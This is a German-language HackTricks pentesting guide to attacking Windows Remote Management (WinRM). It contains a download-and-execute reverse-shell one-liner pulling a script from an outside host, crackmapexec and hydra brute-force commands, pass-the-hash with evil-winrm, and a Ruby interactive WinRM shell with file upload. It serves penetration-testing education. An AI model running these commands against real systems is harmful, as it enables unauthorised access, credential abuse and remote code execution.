# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) wird als **Protokoll von Microsoft** hervorgehoben, das die **Fernverwaltung von Windows-Systemen** über HTTP(S) ermöglicht und dabei SOAP nutzt. Es wird grundlegend von WMI unterstützt und präsentiert sich als HTTP-basiertes Interface für WMI-Operationen.

Das Vorhandensein von WinRM auf einem Rechner ermöglicht eine unkomplizierte Fernadministration über PowerShell, ähnlich wie SSH für andere Betriebssysteme funktioniert. Um festzustellen, ob WinRM aktiv ist, wird empfohlen, die Öffnung bestimmter Ports zu überprüfen:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Ein offener Port aus der obigen Liste zeigt an, dass WinRM eingerichtet wurde, was Versuche zur Initiierung einer Remote-Sitzung erlaubt.

### **Initiierung einer WinRM-Sitzung**

Um PowerShell für WinRM zu konfigurieren, kommt Microsofts `Enable-PSRemoting` Cmdlet zum Einsatz, das den Computer so einrichtet, dass er Remote-PowerShell-Befehle akzeptiert. Mit erhöhtem PowerShell-Zugriff können die folgenden Befehle ausgeführt werden, um diese Funktionalität zu aktivieren und jeden Host als vertrauenswürdig zu kennzeichnen:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Dieser Ansatz beinhaltet das Hinzufügen eines Wildcards zur `trustedhosts`-Konfiguration, ein Schritt, der sorgfältige Überlegungen aufgrund seiner Implikationen erfordert. Es wird auch angemerkt, dass es notwendig sein könnte, den Netzwerktyp von "Öffentlich" auf "Arbeit" auf dem Rechner des Angreifers zu ändern.

Darüber hinaus kann WinRM **ferngesteuert aktiviert** werden, indem der `wmic`-Befehl verwendet wird, wie folgt demonstriert:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Diese Methode ermöglicht die Remote-Einrichtung von WinRM und verbessert die Flexibilität bei der Verwaltung von Windows-Maschinen aus der Ferne.

### Testen, ob konfiguriert

Um die Einrichtung Ihrer Angriffsmaschine zu überprüfen, wird der Befehl `Test-WSMan` verwendet, um zu prüfen, ob das Ziel WinRM ordnungsgemäß konfiguriert hat. Durch die Ausführung dieses Befehls sollten Sie Details zur Protokollversion und wsmid erhalten, die auf eine erfolgreiche Konfiguration hinweisen. Nachfolgend finden Sie Beispiele, die die erwartete Ausgabe für ein konfiguriertes Ziel im Vergleich zu einem nicht konfigurierten zeigen:

- Für ein Ziel, das **ordentlich** konfiguriert ist, wird die Ausgabe ähnlich wie folgt aussehen:
```bash
Test-WSMan <target-ip>
```
Die Antwort sollte Informationen über die Protokollversion und wsmid enthalten, die signalisieren, dass WinRM korrekt eingerichtet ist.

![](<../images/image (582).png>)

- Im Gegensatz dazu würde ein Ziel, das **nicht** für WinRM konfiguriert ist, keine solchen detaillierten Informationen liefern, was das Fehlen einer ordnungsgemäßen WinRM-Konfiguration hervorhebt.

![](<../images/image (458).png>)

### Führen Sie einen Befehl aus

Um `ipconfig` remote auf einem Zielrechner auszuführen und die Ausgabe anzuzeigen, tun Sie:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Sie können auch **einen Befehl Ihrer aktuellen PS-Konsole über** _**Invoke-Command**_ **ausführen**. Angenommen, Sie haben lokal eine Funktion namens _**enumeration**_ und möchten sie **auf einem Remote-Computer ausführen**, können Sie Folgendes tun:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Ein Skript ausführen
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Reverse-Shell erhalten
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Erhalte eine PS-Sitzung

Um eine interaktive PowerShell-Shell zu erhalten, verwende `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**Die Sitzung wird in einem neuen Prozess (wsmprovhost) innerhalb des "Opfers" ausgeführt.**

### **WinRM Öffnen Erzwingen**

Um PS Remoting und WinRM zu verwenden, aber der Computer nicht konfiguriert ist, könnten Sie es mit folgendem aktivieren:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Speichern und Wiederherstellen von Sitzungen

Dies **funktioniert nicht**, wenn die **Sprache** auf dem Remote-Computer **eingeschränkt** ist.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Innerhalb dieser Sitzungen können Sie PS-Skripte mit _Invoke-Command_ laden.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Fehler

Wenn Sie den folgenden Fehler finden:

`enter-pssession : Verbindung zum Remote-Server 10.10.10.175 fehlgeschlagen mit der folgenden Fehlermeldung : Der WinRM-Client kann die Anfrage nicht verarbeiten. Wenn das Authentifizierungsschema von Kerberos abweicht oder wenn der Client-Computer nicht zu einer Domäne gehört, muss HTTPS-Transport verwendet werden oder die Zielmaschine muss zur TrustedHosts-Konfiguration hinzugefügt werden. Verwenden Sie winrm.cmd, um TrustedHosts zu konfigurieren. Beachten Sie, dass Computer in der TrustedHosts-Liste möglicherweise nicht authentifiziert sind. Sie können weitere Informationen dazu erhalten, indem Sie den folgenden Befehl ausführen: winrm help config. Weitere Informationen finden Sie im Hilfethema about_Remote_Troubleshooting.`

Der Versuch auf dem Client (Informationen von [hier](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## WinRM-Verbindung in Linux

### Brute Force

Seien Sie vorsichtig, das Brute-Forcen von winrm könnte Benutzer blockieren.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Verwendung von evil-winrm
```ruby
gem install evil-winrm
```
Lesen Sie die **Dokumentation** auf GitHub: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Um evil-winrm zu verwenden, um sich mit einer **IPv6-Adresse** zu verbinden, erstellen Sie einen Eintrag in _**/etc/hosts**_, der einen **Domainnamen** der IPv6-Adresse zuweist, und verbinden Sie sich mit dieser Domain.

### Pass the hash mit evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### Verwendung einer PS-Docker-Maschine
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Verwendung eines Ruby-Skripts

**Code hierher extrahiert:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

## References

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Automatische Befehle
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
{{#include ../banners/hacktricks-training.md}}
